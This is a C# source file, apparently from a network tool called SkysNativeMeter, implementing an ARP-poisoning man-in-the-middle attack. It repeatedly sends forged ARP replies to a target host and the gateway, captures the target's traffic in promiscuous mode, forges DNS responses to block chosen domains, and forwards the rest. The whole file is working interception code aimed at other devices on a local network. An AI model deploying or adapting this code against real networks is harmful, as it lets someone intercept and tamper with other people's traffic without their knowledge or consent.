using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;

namespace SkysNativeMeter;

internal sealed class ArpDnsBlock : IDisposable
{
    private readonly string _targetIp;
    private readonly PhysicalAddress _targetMac;
    private readonly string _gatewayIp;
    private readonly LibPcapLiveDevice _device;
    private readonly PhysicalAddress _ourMac;
    private readonly HashSet<string> _blockedDomains;
    private readonly bool _selective;
    private readonly bool _whitelistMode;
    private readonly CancellationTokenSource _cts = new();
    private PhysicalAddress _gatewayMac;

    public ArpDnsBlock(
        string targetIp,
        string targetMac,
        string gatewayIp,
        string ifaceHint,
        string localIp,
        IEnumerable<string>? blockedDomains = null,
        string mode = "block")
    {
        _targetIp = targetIp;
        _targetMac = NetworkHelper.ParseMac(targetMac);
        _gatewayIp = gatewayIp;
        _device = NetworkHelper.ResolveDevice(ifaceHint, localIp);
        _ourMac = NetworkHelper.GetOurMac(_device);
        _blockedDomains = new HashSet<string>(
            blockedDomains?.Select(d => d.Trim().ToLowerInvariant()) ?? new[] { "*" },
            StringComparer.OrdinalIgnoreCase);
        _whitelistMode = string.Equals(mode, "whitelist", StringComparison.OrdinalIgnoreCase);
        _selective = _whitelistMode || !_blockedDomains.Contains("*");
        _gatewayMac = NetworkHelper.ResolveMac(gatewayIp, PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"));

        NetworkHelper.EnableIpForwarding(_device.Description);
        NetworkHelper.WarmArp(_targetIp);
        NetworkHelper.WarmArp(_gatewayIp);
        _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
    }

    public void Run()
    {
        _device.Open(DeviceModes.Promiscuous, 1000);
        _device.Filter = $"ip and host {_targetIp}";

        NetworkHelper.EmitJson(new
        {
            type = "started",
            mode = "dnsblock",
            ip = _targetIp,
            mac = NetworkHelper.NormalizeMac(_targetMac.ToString()),
            selective = _selective,
            whitelist = _whitelistMode,
            engine = "native"
        });

        _device.OnPacketArrival += OnPacket;
        var poisonTask = Task.Run(PoisonLoop, _cts.Token);

        try
        {
            _device.Capture();
        }
        catch (OperationCanceledException)
        {
            // shutting down
        }
        finally
        {
            _device.OnPacketArrival -= OnPacket;
            try { _device.StopCapture(); } catch { /* ignore */ }
            try { _device.Close(); } catch { /* ignore */ }
            _cts.Cancel();
            Task.WaitAll(new[] { poisonTask }, 2000);
        }
    }

    private void PoisonLoop()
    {
        while (!_cts.IsCancellationRequested)
        {
            try
            {
                _gatewayMac = NetworkHelper.ResolveMac(_gatewayIp, _gatewayMac);
                MitmForwarder.SendArpReply(
                    _device,
                    _ourMac,
                    _targetMac,
                    _targetMac,
                    IPAddress.Parse(_targetIp),
                    IPAddress.Parse(_gatewayIp));
                MitmForwarder.SendArpReply(
                    _device,
                    _ourMac,
                    _gatewayMac,
                    _gatewayMac,
                    IPAddress.Parse(_gatewayIp),
                    IPAddress.Parse(_targetIp));
            }
            catch
            {
                // continue
            }

            Thread.Sleep(1500);
        }
    }

    private void OnPacket(object? sender, PacketCapture e)
    {
        try
        {
            var raw = e.GetPacket();
            var packet = Packet.ParsePacket(raw.LinkLayerType, raw.Data);
            if (packet is not EthernetPacket eth || eth.PayloadPacket is not IPv4Packet ip)
            {
                return;
            }

            if (ip.Protocol != ProtocolType.Udp || ip.PayloadPacket is not UdpPacket udp)
            {
                ForwardIp(ip, ip.SourceAddress.ToString() == _targetIp ? _gatewayMac : _targetMac);
                return;
            }

            if (ip.SourceAddress.ToString() == _targetIp && udp.DestinationPort == 53)
            {
                var query = udp.PayloadData ?? Array.Empty<byte>();
                var domain = DnsHelper.ParseQueryDomain(query);
                var shouldBlock = _whitelistMode
                    ? !DnsHelper.IsAllowedInWhitelist(domain, _blockedDomains)
                    : !_selective || DnsHelper.ShouldBlock(domain, _blockedDomains);

                if (shouldBlock)
                {
                    var response = DnsHelper.BuildBlockedDnsResponse(query);
                    if (response.Length > 0)
                    {
                        var replyIp = new IPv4Packet(ip.DestinationAddress, ip.SourceAddress)
                        {
                            Protocol = ProtocolType.Udp,
                            PayloadPacket = new UdpPacket((ushort)udp.DestinationPort, (ushort)udp.SourcePort)
                            {
                                PayloadData = response
                            }
                        };
                        replyIp.UpdateCalculatedValues();
                        var replyEth = new EthernetPacket(_targetMac, _ourMac, EthernetType.IPv4)
                        {
                            PayloadPacket = replyIp
                        };
                        replyEth.UpdateCalculatedValues();
                        _device.SendPacket(replyEth.Bytes);
                    }
                }
                else
                {
                    ForwardIp(ip, _gatewayMac);
                }

                return;
            }

            ForwardIp(ip, ip.SourceAddress.ToString() == _targetIp ? _gatewayMac : _targetMac);
        }
        catch
        {
            // ignore
        }
    }

    private void ForwardIp(IPv4Packet ip, PhysicalAddress destMac)
    {
        MitmForwarder.ForwardIp(_device, _ourMac, ip, destMac);
    }

    public void Dispose()
    {
        _cts.Cancel();
        try { _device.StopCapture(); } catch { /* ignore */ }
        try { _device.Close(); } catch { /* ignore */ }
    }
}
